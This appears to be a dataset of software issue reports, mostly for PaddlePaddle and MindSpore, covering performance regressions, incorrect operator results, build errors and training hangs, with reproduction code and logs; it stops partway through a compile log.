Mobilenet fp32 latency regression,"We found a FP32 latency regression of Image classification model especially on MobileNet from 3.04ms to 8.46ms based on SKX-8180 1 socket. This regression caused by PR#14707 and below commit ID: commit 669191c9cced3fdc25f63a551fd3741af55b302e Author: Yihua Xu yihua.xu@intel.com Date: Mon Dec 3 11:54:00 2018 +0800 We can use CAPI Image classification application to reproduce it. You also can use python script to reproduce this latency regression, but it has lower regression ratio than CAPI caused by overhead. Please have a look into it. @ luotao @yihuaXu @jianhang-liu   <code>: Implement conv3d with mkldnn library (test=develop) FLAGS_use_mkldnn=true FLAGS_paddle_num_threads=28 KMP_AFFINITY=compact,granularity=fine taskset -c 0-27 numactl -l ./build/infer_image_classification \ --infer_model=${infer_model} \ --batch_size=1 \ --profile \ --skip_batch_num=10 \ --iterations=1000 \ --use_mkldnn \ --paddle_num_threads=28 \ --use_fake_data=true eval.py"
It seems that generic.cmake makes all targets depend on all external projects,"It seems that in , there are line like https://github.com/PaddlePaddle/Paddle/blob/develop/cmake/generic.cmake#L47 that makes the target depends on all external projects. Is this overweighted? I noticed this and got the question when I was commenting https://github.com/PaddlePaddle/Paddle/pull/2174#discussion_r117023120   <code>: {cc,nv}_{library,binary,test}"
GatherNd计算错误,"bug GatherNd算子动态图计算错误 Hardware Environment() / 硬件环境: X86 + Tesla T4 /device GPU : -- MindSpore version : 1.5.1 -- Python version : 3.7.5 -- OS platform and distribution : Ubuntu 18.04 -- GCC/Compiler version : 7.5.0 (/): PyNative /mode pynative 出错代码： 执行上述代码 计算结果应该全是0，实际计算结果包含了非0的数据。   <code>: import mindspore import numpy as np from mindspore import Tensor import mindspore.ops as ops import mindspore.context as context context.set_context(device_target=""GPU"", mode=context.PYNATIVE_MODE) input0 = Tensor(np.random.rand(2,3,4,5), dtype=mindspore.float64) indices = Tensor(np.array([[[15, 11], [18, -10], [6, 19]], [[5, -4], [23, 1], [13, -2]], [[27, 17], [8, 17], [-2, -8]], [[7, -8], [-5, 6], [27, -1]], [[9, -9], [-10, 4], [-4, 26]]]), dtype=mindspore.int64) update = Tensor(np.random.rand(5,3,4,5), dtype=mindspore.float64) input1 = Tensor(np.random.rand(2,3,4,5), dtype=mindspore.float64) op = ops.TensorScatterUpdate() output = op(input0, indices, update) op = ops.GatherNd() output = op(input1, indices) print(output)"
mindspore.nn.Conv2d 卷积算子计算时出现巨大误差！！,"【Document Link】/【文档链接】 在使用mindspore复现Lite-HRNet时，导入模型参数文件后，发现输出结果与预期相差较大，随后定位到某卷积层，导出其模型参数并使用如下代码测试后，发现输出结果与预期相差较大 【Issues Section】/【问题文档片段】 【Existing Issues】/【存在的问题】 这三行代码输出数值应当相同或误差极小，但在实际测试中，pytorch的输出结果和理想结果（即直接axis=1相加）相等，均为-4.851142，mindspore结果为-4.8506775，与前两者的误差达到了1e-3数量级，明显超出合理范围。但如果将（16，16，1，1）的参数文件切分为两个（16，8，1，1），使用mindspore作两次卷积后将结果相加，得出的结果与理想结果相同 <ol start=""4""> 【Expected Result】【预期结果】 mindspore卷积输出结果应当与理想结果 Please fill in the expected result   <code>: import torch from mindspore import load_checkpoint, load_param_into_net, context import mindspore as ms import numpy as np context.set_context(mode=context.PYNATIVE_MODE,) conv_ms = ms.nn.Conv2d(16, 16, kernel_size=1, stride=1, padding=0,has_bias=False) conv_th = torch.nn.Conv2d(16,16,kernel_size=1, stride=1, padding=0,bias=False) val = torch.FloatTensor([[ 0.06743588, -0.3068997 , -0.17153701, -1.8626745 , -0.40757486, -0.33757177, -0.1822867 , 0.1387877 , -0.26386654, -0.00289909, -0.25422415, -0.24847126, -0.12029067, -0.21031168, -0.24939494, -0.4393624 ], [ 0.05006754, -0.13086851, -0.7037203 , -0.07114138, 0.26736528, -0.37536255, 0.06900621, 1.5387039 , 0.3239505 , -0.23493186, 0.18741542, -0.01882728, 0.62558365, -0.0443452 , 0.330959 , -0.58384347], [ 1.3723787 , -1.1821833 , 0.04130812, 0.09994317, 0.09240443, 0.4121954 , 0.0078634 , -0.0989856 , 0.07490222, 0.34334874, 0.09595726, -0.04575352, -0.20779987, -0.2662903 , -0.04661159, 0.10811049], [ 0.02432996, 0.41810453, -0.11759453, -0.07181975, -0.1003346 , -0.25013918, -0.01199104, 0.739777 , 0.77364564, -0.03933979, 0.07019445, -0.09136659, 0.4585008 , -0.13965991, 0.15699728, -0.8681071 ], [ 0.01865791, -0.03467035, 0.2182442 , -0.10818084, -0.13563791, 0.29205424, 0.02226558, 2.2566915 , -0.2750345 , 0.15257521, -0.21786663, -0.02752571, -0.3043707 , 0.00644709, 0.00308411, 0.26630616], [-0.04855161, 0.13326994, -0.06545139, -0.316102 , -0.8649562 , 0.37733084, -0.09724917, 0.11176591, 0.24010974, -0.37306798, 0.53591 , -0.1589174 , -0.19619572, 0.24928957, 0.9070062 , 0.09550266], [-0.10056285, 0.16915976, -0.157688 , 0.78347427, 0.4057816 , 0.04936442, 2.1889467 , -0.05112061, -0.08497846, -0.06645991, -0.1041553 , 0.5827602 , -0.10159867, 0.09819083, -0.02677052, 0.03242535], [ 0.10450547, -0.1026931 , 0.56983787, 0.08131447, -0.17488144, 0.24844232, -0.02229008, -0.01995133, 0.46804965, 0.07825436, 0.6841632 , 0.05634749, -0.1183577 , 0.03671124, 0.28341055, 0.40557736], [ 0.09961444, 0.12418628, 0.74432135, 0.15444994, 0.1471684 , 1.575953 , 0.08447831, -0.12656116, 0.37912083, 0.5368025 , 0.2552442 , 0.11951698, 0.36892125, 0.16231878, -0.326557 , 0.23971342], [-0.02418708, 0.17805189, 0.15127178, 0.26692796, 0.3936053 , 0.04189789, -0.9817548 , 0.01904236, 0.18990783, -0.2072201 , 0.13620862, 2.0317976 , -0.24787821, 0.12689479, -0.17954113, 0.3406608 ], [-0.14090158, 0.05421948, -0.37497592, -0.02161774, 0.36569694, 0.17031886, 0.01802287, 0.01958149, -0.42398816, 0.21507186, -0.69250274, -0.02805115, 0.05882715, 0.04518748, -0.49283642, -0.34791553], [ 0.04504255, -0.51307523, 0.57809085, 0.06484161, 0.06902407, 0.3140802 , 0.0240107 , -0.44429973, -0.59140563, -0.04998004, -0.62915385, 0.07677887, -1.6195922 , 0.21273479, -0.16506904, 0.63758767], [-0.06877003, 0.07237156, -0.08562495, 0.9429558 , 0.05674777, 0.12096652, -0.99029183, -0.06737434, -0.07273407, -0.02427965, -0.07561678, -1.8166206 , -0.04828733, 0.0284429 , -0.03177145, -0.0511715 ], [-1.1394142 , -0.4489494 , -0.02435309, 0.09900233, -0.10293427, -0.03211262, -0.01061922, -0.1135482 , -0.04054678, -0.7225278 , 0.14862984, 0.05454976, -0.282747 , 2.464047 , 0.11691279, 0.1554886 ], [ 0.04531105, 0.0751367 , 0.920519 , 0.39366513, 0.14468938, -0.193099 , 0.07872216, -0.3149487 , -0.34231845, 0.5101835 , -0.86432683, 0.1819306 , -0.04758266, -0.38186935, -0.07190214, 0.38783506], [-0.16577658, -0.01595718, 0.9908955 , -0.04115746, -0.40255997, 0.12793839, -0.04710438, -0.03749802, -0.37290257, 0.15887815, -0.7114337 , -0.03952295, -1.2223322 , 0.03193424, 0.47154874, 0.68726397]]) val = val.reshape(16,16,1,1) ms_val = ms.Parameter(val.numpy()) st_dict = {""weight"":val} conv_th.load_state_dict(st_dict) load_param_into_net(conv_ms,{""weight"":ms_val}) ones_ms = ms.Tensor(np.ones((1,16,64,48)),dtype=ms.float32) ones_th = torch.FloatTensor(np.ones((1,16,64,48))) th_res = conv_th(ones_th).detach() ms_res = conv_ms(ones_ms) print(th_res[0][0][0][0]) print(ms_res[0][0][0][0]) val_numpy = val.numpy() val_sum=val_numpy.sum(axis=1) print(val_sum.reshape(16,)[0]) print(th_res[0][0][0][0]) print(ms_res[0][0][0][0]) print(val_sum.reshape(16,)[0])"
DockerFile里面下载的文件可能有误,"标题：DockerFile里 提供的TRT lib文件可能有误 1）PaddlePaddle版本： 2）CPU： 3）GPU：CUDA8, cuDNN 7 4）系统环境：ubuntu1604 安装方式信息： 1）pip安装/docker安装 2）本地编译：请提供cmake命令，编译命令 3）docker编译：请提供docker镜像，编译命令 特殊环境请注明：如离线安装等 复现信息： 问题描述：TensorRT 库文件 在bce里提供的下载文件 https://paddlepaddledeps.bj.bcebos.com/TensorRT-4.0.1.6-ubuntu14.04.x86_64-gnu.cuda.8.0.cudnn7.0.tar.gz 中 NvInfer.h 貌似有变动。 以前 现在 现在的文件里面缺乏析构函数，编译的时候会报错。   <code>: class IGpuAllocator { public: virtual ~IGpuAllocator() {} /** * a callback implemented by the application to handle acquisition of GPU memory * * \param size the size of the memory required * \param alignment the alignment of the memory required. Alignment will zero or be a power of 2 not greater than 256, and thus this allocator can be safely implemented with cudaMalloc/cudaFree. An alignment value of zero indicates any alignment is acceptable. * \param flags reserved for future use. In the current release, 0 will be passed. * * If an allocation request of size 0 is made, nullptr should be returned. * * If an allocation request cannot be satisfied, nullptr should be returned. */ virtual void* allocate(uint64_t size, uint64_t alignment, uint32_t flags) = 0; /** * a callback implemented by the application to handle release of GPU memory. * * TensorRT may pass a nullptr to this function if it was previously returned by allocate() * * \param memory the acquired memory. */ virtual void free(void* memory) = 0; }; class IGpuAllocator { public: //! //! A callback implemented by the application to handle acquisition of GPU memory. //! //! \param size The size of the memory required. //! \param alignment The alignment of the memory required. Alignment will zero or be a power of 2 not greater than 256, and thus this allocator can be safely implemented with cudaMalloc/cudaFree. An alignment value of zero indicates any alignment is acceptable. //! \param flags Reserved for future use. In the current release, 0 will be passed. //! //! If an allocation request of size 0 is made, nullptr should be returned. //! //! If an allocation request cannot be satisfied, nullptr should be returned. //! virtual void* allocate(uint64_t size, uint64_t alignment, uint32_t flags) = 0; //! //! A callback implemented by the application to handle release of GPU memory. //! //! TensorRT may pass a nullptr to this function if it was previously returned by allocate(). //! //! \param memory The acquired memory. //! virtual void free(void* memory) = 0; };"
There exists redundant output in sequence_pool operator ,"is invisible for outside, so need set to avoid core dump. https://github.com/PaddlePaddle/Paddle/blob/6f347faafeeaebe237c012f8d4233bda0112c80b/python/paddle/v2/fluid/layers/nn.py#L781   <code>: max_index max_index.stop_gradient = True"
ReturnCode.java未知返回码,"ReturnCode.java中如果没有找到对应ErrMsg，则返回""未知返回码："" + errCode 但ApiResult.java中调用的方法如下 可见永远不会走到return (String)attrs.get(""errmsg""); 微信api有些errCode并未写在全局返回码说明中，比如40163:code been used. 导致getErrorMsg无法获取到真正的errmsg，而是“未知返回码”，似乎不太好 建议改成如下   <code>: /** * 通过返回码获取返回信息 * @param errCode 错误码 * @return {String} */ public static String get(int errCode){ String result = errCodeToErrMsg.get(errCode); return result != null ? result : ""未知返回码："" + errCode; } public String getErrorMsg() { Integer errorCode = getErrorCode(); if (errorCode != null) { String result = ReturnCode.get(errorCode); if (result != null) return result; } return (String)attrs.get(""errmsg""); } /** * 通过返回码获取返回信息 * @param errCode 错误码 * @return {String} */ public static String get(int errCode){ return errCodeToErrMsg.get(errCode); }"
多卡训练中随机出现疑似显存不足？,"PaddlePaddle 2.0.2 Ubuntu 18.04 Python 3.7 CUDA 10.2 在训练过程中，已经训练了好几轮了，突然就出现这个。我的显存是11G，一开始我的显存只占用3.8G，很明显是够用的。不知道为啥这样。   <code>: [2021-05-07 23:20:27.405148] Train epoch 5, batch_id: 1900, loss: 0.610733 [2021-05-07 23:20:35.769312] Train epoch 5, batch_id: 2000, loss: 0.622740 [2021-05-07 23:20:44.189663] Train epoch 5, batch_id: 2100, loss: 0.574676 [2021-05-07 23:20:52.561204] Train epoch 5, batch_id: 2200, loss: 0.654894 -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 std::_Sp_counted_ptr&lt;paddle::imperative::VarBase*, (__gnu_cxx::_Lock_policy)2&gt;::_M_dispose() 1 std::_Sp_counted_base&lt;(__gnu_cxx::_Lock_policy)2&gt;::_M_release() 2 paddle::framework::SignalHandle(char const*, int) 3 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: `Termination signal` is detected by the operating system. [TimeInfo: *** Aborted at 1620400853 (unix time) try ""date -d @1620400853"" if you are using GNU date ***] [SignalInfo: *** SIGTERM (@0x3e800007b77) received by PID 31620 (TID 0x7f631d3d2740) from PID 31607 ***] Traceback (most recent call last): File ""train.py"", line 149, in &lt;module&gt; dist.spawn(train, args=(args,)) File ""/home/psdz/anaconda3/envs/PaddlePaddle2/lib/python3.7/site-packages/paddle/distributed/spawn.py"", line 449, in spawn while not context.join(): File ""/home/psdz/anaconda3/envs/PaddlePaddle2/lib/python3.7/site-packages/paddle/distributed/spawn.py"", line 255, in join self._throw_exception(error_index) File ""/home/psdz/anaconda3/envs/PaddlePaddle2/lib/python3.7/site-packages/paddle/distributed/spawn.py"", line 263, in _throw_exception (error_index, name)) Exception: Process 1 terminated with signal SIGKILL."
Cluster training DeepFM always stuck at the beginning,"I started a 10 node job with 10 pservers and 10 trainers. Using DeepFM model (converted to paddle v1 code), the job always stuck before the trainer can run batches. pserver log: trainer log:   <code>: commandline: ./paddle_pserver2 --num_gradient_servers=10 --nics=xgbe0 --port=7164 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job W1206 12:25:42.604581 29267 CpuId.h:112] PaddlePaddle wasn't compiled to use avx instructions, but these are available on your machine and could speed up CPU computations via CMAKE .. -DWITH_AVX=ON I1206 12:25:42.605259 29267 ParameterServerController.cpp:83] number of parameterServer instances: 2 I1206 12:25:42.605267 29267 ParameterServerController.cpp:87] Starting parameterServer[0] I1206 12:25:42.605304 29267 ParameterServerController.cpp:87] Starting parameterServer[1] I1206 12:25:42.605325 29267 ParameterServerController.cpp:96] Waiting parameterServer[0] I1206 12:25:42.605643 29288 LightNetwork.cpp:273] tcp server start I1206 12:25:42.605721 29287 LightNetwork.cpp:273] tcp server start I1206 12:36:39.935209 23676 LightNetwork.cpp:326] worker started, peer = 10.104.100.14 I1206 12:36:39.960119 23677 LightNetwork.cpp:326] worker started, peer = 10.104.100.14 I1206 12:40:23.655452 4484 LightNetwork.cpp:326] worker started, peer = 10.102.196.43 I1206 12:40:23.683399 4485 LightNetwork.cpp:326] worker started, peer = 10.102.196.43 I1206 12:40:25.714017 4485 ParameterServer2.cpp:256] pserver: setParameter I1206 12:40:25.714077 4485 ParameterServer2.cpp:302] pserver: new cpuvector: size=1196032 I1206 12:40:25.737254 4484 ParameterServer2.cpp:256] pserver: setParameter I1206 12:40:25.743959 4484 ParameterServer2.cpp:302] pserver: new cpuvector: size=30000 I1206 12:40:25.766773 4686 LightNetwork.cpp:326] worker started, peer = 10.102.196.43 I1206 12:40:25.810925 4688 LightNetwork.cpp:326] worker started, peer = 10.102.196.43 I1206 12:40:26.050133 23677 ParameterServer2.cpp:564] pserver: getParameter I1206 12:48:30.094723 8188 LightNetwork.cpp:326] worker started, peer = 10.102.196.37 I1206 12:48:30.119384 8189 LightNetwork.cpp:326] worker started, peer = 10.102.196.37 I1206 12:48:32.120713 8189 ParameterServer2.cpp:564] pserver: getParameter I1206 12:50:31.704797 18232 LightNetwork.cpp:326] worker started, peer = 10.102.196.39 I1206 12:50:31.731204 18233 LightNetwork.cpp:326] worker started, peer = 10.102.196.39 I1206 12:50:33.527307 18356 LightNetwork.cpp:326] worker started, peer = 10.102.196.41 I1206 12:50:33.564779 18363 LightNetwork.cpp:326] worker started, peer = 10.102.196.41 I1206 12:50:33.732800 18233 ParameterServer2.cpp:564] pserver: getParameter I1206 12:50:35.555511 18363 ParameterServer2.cpp:564] pserver: getParameter I1206 12:51:13.538336 21095 LightNetwork.cpp:326] worker started, peer = 10.104.100.12 I1206 12:51:13.562628 21097 LightNetwork.cpp:326] worker started, peer = 10.104.100.12 I1206 12:51:15.564131 21097 ParameterServer2.cpp:564] pserver: getParameter I1206 12:51:33.749547 22697 LightNetwork.cpp:326] worker started, peer = 10.102.196.44 I1206 12:51:33.776844 22701 LightNetwork.cpp:326] worker started, peer = 10.102.196.44 I1206 12:51:35.778558 22701 ParameterServer2.cpp:564] pserver: getParameter I1206 12:55:58.762526 4722 LightNetwork.cpp:326] worker started, peer = 10.102.196.38 I1206 12:55:58.790271 4723 LightNetwork.cpp:326] worker started, peer = 10.102.196.38 I1206 12:56:00.792819 4723 ParameterServer2.cpp:564] pserver: getParameter I1206 12:56:01.233184 4860 LightNetwork.cpp:326] worker started, peer = 10.102.196.42 I1206 12:56:01.260675 4861 LightNetwork.cpp:326] worker started, peer = 10.102.196.42 I1206 12:56:03.409593 4861 ParameterServer2.cpp:564] pserver: getParameter I1206 12:57:06.424779 9664 LightNetwork.cpp:326] worker started, peer = 10.104.100.11 ./paddle_trainer --num_gradient_servers=10 --trainer_id=5 --pservers=10.102.196.43,10.102.196.42,10.102.196.41,10.104.100.12,10.102.196.37,10.104.100.11,10.102.196.44,10.102.196.38,10.104.100.14,10.102.196.39 --rdma_tcp=tcp --nics=xgbe0 --port=7164 --ports_num=1 --local=0 --job=train --dot_period=10 --saving_period=1 --log_period=20 --trainer_count=1 --num_passes=1 --ports_num_for_sparse=1 --config=conf/trainer_config.conf --save_dir=./output --use_gpu=0 W1206 12:57:04.976786 9582 CpuId.h:112] PaddlePaddle wasn't compiled to use avx instructions, but these are available on your machine and could speed up CPU computations via CMAKE .. -DWITH_AVX=ON I1206 12:57:05.292944 9582 Trainer.cpp:166] trainer mode: SgdSparseCpuTraining I1206 12:57:05.292971 9582 TrainerInternal.cpp:239] Sgd sparse training can not work with ConcurrentRemoteParameterUpdater, automatically reset --use_old_updater=true I1206 12:57:05.498909 9582 PyDataProvider2.cpp:243] loading dataprovider dataprovider::process_deep I1206 12:57:05.553319 9582 GradientMachine.cpp:94] Initing parameters.. I1206 12:57:06.414937 9582 GradientMachine.cpp:101] Init parameters done. I1206 12:57:06.415112 9621 ParameterClient2.cpp:113] pserver 0 10.102.196.43:7165 I1206 12:57:06.415400 9621 ParameterClient2.cpp:113] pserver 1 10.102.196.42:7165 I1206 12:57:06.415513 9621 ParameterClient2.cpp:113] pserver 2 10.102.196.41:7165 I1206 12:57:06.415627 9621 ParameterClient2.cpp:113] pserver 3 10.104.100.12:7165 I1206 12:57:06.415748 9621 ParameterClient2.cpp:113] pserver 4 10.102.196.37:7165 I1206 12:57:06.415866 9621 ParameterClient2.cpp:113] pserver 5 10.104.100.11:7165 I1206 12:57:06.415930 9621 ParameterClient2.cpp:113] pserver 6 10.102.196.44:7165 I1206 12:57:06.416048 9621 ParameterClient2.cpp:113] pserver 7 10.102.196.38:7165 I1206 12:57:06.416160 9621 ParameterClient2.cpp:113] pserver 8 10.104.100.14:7165 I1206 12:57:06.416251 9621 ParameterClient2.cpp:113] pserver 9 10.102.196.39:7165 I1206 12:57:06.439986 9582 ParameterClient2.cpp:113] pserver 0 10.102.196.43:7164 I1206 12:57:06.440148 9582 ParameterClient2.cpp:113] pserver 1 10.102.196.42:7164 I1206 12:57:06.440269 9582 ParameterClient2.cpp:113] pserver 2 10.102.196.41:7164 I1206 12:57:06.440351 9582 ParameterClient2.cpp:113] pserver 3 10.104.100.12:7164 I1206 12:57:06.440423 9582 ParameterClient2.cpp:113] pserver 4 10.102.196.37:7164 I1206 12:57:06.440512 9582 ParameterClient2.cpp:113] pserver 5 10.104.100.11:7164 I1206 12:57:06.440629 9582 ParameterClient2.cpp:113] pserver 6 10.102.196.44:7164 I1206 12:57:06.440716 9582 ParameterClient2.cpp:113] pserver 7 10.102.196.38:7164 I1206 12:57:06.440809 9582 ParameterClient2.cpp:113] pserver 8 10.104.100.14:7164 I1206 12:57:06.440871 9582 ParameterClient2.cpp:113] pserver 9 10.102.196.39:7164"
blazeface使用mkldnn进行预测时报错,"paddle版本：develop 预测脚本数据和模型： infer_blazenas_mkldnn.zip 报错信息： CPU信息：   <code>: processor : 0 vendor_id : GenuineIntel cpu family : 6 model : 85 model name : Intel(R) Xeon(R) Gold 6148 CPU @ 2.40GHz stepping : 4 microcode : 0x1 cpu MHz : 2399.994 cache size : 4096 KB physical id : 0 siblings : 1 core id : 0 cpu cores : 1 apicid : 0 initial apicid : 0 fpu : yes fpu_exception : yes cpuid level : 13 wp : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon rep_good nopl eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch arat fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm mpx avx512f rdseed adx smap avx512cd xsaveopt xsavec xgetbv1 bogomips : 4799.98 clflush size : 64 cache_alignment : 64 address sizes : 40 bits physical, 48 bits virtual power management:"
MacOS编译安装paddle v1.0问题（持续更新）,1、10.13版本MacOS编译安装可以正常通过，import时候会报错，是本机环境问题，安装编译过程没有问题，这里是一个不可控风险，因为用户环境多样，可能需要FAQ来支持。 2、重要为了保证环境纯净，我低格Mac重做系统，发现Apple在9月末更新了10.14版本的OS，带来的结果是10.13用的c++编译器是9.1，10.14用的c++编译器是10.0，导致编译出错，无法正常编译通过，涉及版本python2，python3。 3、指令错误。 此错误在使用，后可以正确import paddle.fluid。这里官网需要注明一下。   <code>: export LD_LIBRARY_PATH=/Library/Frameworks/Python.framework/Versions/3.5 export DYLD_LIBRARY_PATH=/Library/Frameworks/Python.framework/Versions/3.5
furion框架下的sqlsugar执行存储过程，老是出错，请大神指教,"代码如下： _sysJgxxkRep.Context.ChangeDatabase(""3"");   <code>: var ksbmP = new SqlSugar.SugarParameter(""@ksbm"", strKsbm); var QureyDateP = new SqlSugar.SugarParameter(""@queryDate"", strQueryDate); var jgbmP = new SqlSugar.SugarParameter(""@jgbm"", strJgbm); var ysxx = await _sysJgxxkRep.Ado.UseStoredProcedure().GetDataTableAsync(""exec usp_yyzx_yy_view_day_hao "", ksbmP, QureyDateP, jgbmP); return ConvertHelper&lt;SysJgxxk&gt;.ConvertToList(ysxx);"
AutoComplete组件用户在下拉列表中选取某项后增加触发事件,"AutoComplete组件，现有版本当用户在下拉列表中选取某项后，组件不暴露任何事件，调用代码无法立即获知用户的选择。 添加事件属性，用户无论是通过鼠标点击还是键盘回车键，一旦在下拉列表中选择了某项，立即通过回调函数进行通知。   <code>: &lt;AutoComplete ItemSelected=""@OnItemSelected"" /&gt; @code { private Task OnItemSelected(string value) { // ... return Task.CompletedTask; } }"
关于性能问题,"结果： 差距太大了，是我用的不对么？   <code>: String dateStr = ""2017-08-31 13:01:22""; long begin = System.currentTimeMillis(); DateFormat df = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss""); Date date = df.parse(dateStr); System.out.println(System.currentTimeMillis() - begin + "" : "" + date); begin = System.currentTimeMillis(); date = DateUtil.parseDateTime(dateStr); System.out.println(System.currentTimeMillis() - begin + "" : "" + date); 13 : Thu Aug 31 13:01:22 CST 2017 156 : 2017-08-31 13:01:22"
Compile mindspore failed on CPU,"Compile mindspore failed on CPU : /device gpu /device cpu /device cpu : -- MindSpore version : source, commit ce8d2f87f029207fbdda218d5ed3bd86d0579e03 -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 20.04 -- GCC/Compiler version : gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0 NA execute compile failed Compile failed, and printed. compile successfully 2021/04/25 error: printed.   <code>: bash build.sh -e cpu -j3 cc1plus: all warnings being treated as errors [ 45%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_to_dense_cpu_kernal.cc.o [ 45%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/split_cpu_kernel.cc.o [ 45%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sub_and_filter_cpu_kernel.cc.o /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc: In instantiation of ‘bool mindspore::kernel::SparseToDenseCPUKernel&lt;I, T&gt;::Launch(const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;) [with I = long int; T = Eigen::half]’: /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:35:8: required from here /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:55:9: error: ‘void* memset(void*, int, size_t)’ clearing an object of type ‘struct Eigen::half’ with no trivial copy-assignment; use assignment or value-initialization instead [-Werror=class-memaccess] 55 | memset(output_addr, 0, output_len * sizeof(T)); | ~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In file included from /home/luopengting/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/Core:411, from /data/luopengting/workspace/mindspore/mindspore/core/base/float16.h:28, from /data/luopengting/workspace/mindspore/mindspore/core/ir/tensor.h:30, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/kernel.h:25, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/cpu_kernel.h:24, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:22, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:17: /home/luopengting/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/src/Core/arch/CUDA/Half.h:80:8: note: ‘struct Eigen::half’ declared here 80 | struct half : public half_impl::half_base { | ^~~~ /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc: In instantiation of ‘bool mindspore::kernel::SparseToDenseCPUKernel&lt;I, T&gt;::Launch(const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;, const std::vector&lt;std::shared_ptr&lt;mindspore::kernel::Address&gt; &gt;&amp;) [with I = int; T = Eigen::half]’: /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:35:8: required from here /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:55:9: error: ‘void* memset(void*, int, size_t)’ clearing an object of type ‘struct Eigen::half’ with no trivial copy-assignment; use assignment or value-initialization instead [-Werror=class-memaccess] 55 | memset(output_addr, 0, output_len * sizeof(T)); | ~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In file included from /home/luopengting/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/Core:411, from /data/luopengting/workspace/mindspore/mindspore/core/base/float16.h:28, from /data/luopengting/workspace/mindspore/mindspore/core/ir/tensor.h:30, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/kernel.h:25, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/cpu_kernel.h:24, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.h:22, from /data/luopengting/workspace/mindspore/mindspore/ccsrc/backend/kernel_compiler/cpu/sparse_to_dense_cpu_kernal.cc:17: /home/luopengting/.mslib/eigen3_7c811c289376779282be6059f44b3465/include/eigen3/Eigen/src/Core/arch/CUDA/Half.h:80:8: note: ‘struct Eigen::half’ declared here 80 | struct half : public half_impl::half_base { | ^~~~ cc1plus: all warnings being treated as errors make[2]: *** [mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/build.make:1428: mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_to_dense_cpu_kernal.cc.o] Error 1 make[2]: *** Waiting for unfinished jobs.... make[1]: *** [CMakeFiles/Makefile2:551: mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/all] Error 2 make: *** [Makefile:152: all] Error 2 [ 49%] Building CXX object mindspore/ccsrc/pipeline/jit/CMakeFiles/_mindspore_pipeline_jit_obj.dir/static_analysis/evaluator.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/ops_info/transpose_info.cc.o [ 50%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_apply_adam_cpu_kernel.cc.o [ 50%] Building CXX object mindspore/ccsrc/pipeline/jit/CMakeFiles/_mindspore_pipeline_jit_obj.dir/static_analysis/prim.cc.o [ 50%] Building CXX object mindspore/ccsrc/backend/kernel_compiler/CMakeFiles/_mindspore_backend_kernel_compiler_obj.dir/cpu/sparse_apply_ftrl_cpu_kernel.cc.o [ 50%] Building CXX object mindspore/ccsrc/frontend/parallel/CMakeFiles/_mindspore_frontend_parallel_obj.dir/ops_info/uniform_candidate_sampler_info.cc.o [ 50%] Building CXX object 